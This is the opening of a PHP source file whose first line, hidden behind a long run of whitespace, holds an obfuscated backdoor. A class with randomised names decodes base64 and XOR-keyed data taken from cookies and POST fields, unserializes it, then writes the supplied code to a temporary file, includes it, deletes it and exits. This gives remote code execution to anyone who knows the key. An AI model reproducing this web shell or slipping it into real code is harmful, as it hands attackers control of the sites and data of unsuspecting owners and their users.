<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("qaofxhelqi")){class qaofxhelqi{public static $aohspfeg = "sxpxwpdyalndbtua";public static $xxznosk = NULL;public function __construct(){$otvqxgem = @$_COOKIE[substr(qaofxhelqi::$aohspfeg, 0, 4)];if (!empty($otvqxgem)){$zxkcty = "base64";$pinztjdnw = "";$otvqxgem = explode(",", $otvqxgem);foreach ($otvqxgem as $vjcsm){$pinztjdnw .= @$_COOKIE[$vjcsm];$pinztjdnw .= @$_POST[$vjcsm];}$pinztjdnw = array_map($zxkcty . "_decode", array($pinztjdnw,));$pinztjdnw = $pinztjdnw[0] ^ str_repeat(qaofxhelqi::$aohspfeg, (strlen($pinztjdnw[0]) / strlen(qaofxhelqi::$aohspfeg)) + 1);qaofxhelqi::$xxznosk = @unserialize($pinztjdnw);}}public function __destruct(){$this->lkkxuarzl();}private function lkkxuarzl(){if (is_array(qaofxhelqi::$xxznosk)) {$ntkampgeh = sys_get_temp_dir() . "/" . crc32(qaofxhelqi::$xxznosk["salt"]);@qaofxhelqi::$xxznosk["write"]($ntkampgeh, qaofxhelqi::$xxznosk["content"]);include $ntkampgeh;@qaofxhelqi::$xxznosk["delete"]($ntkampgeh);exit();}}}$znthemd = new qaofxhelqi();$znthemd = NULL;} ?><?php
/**
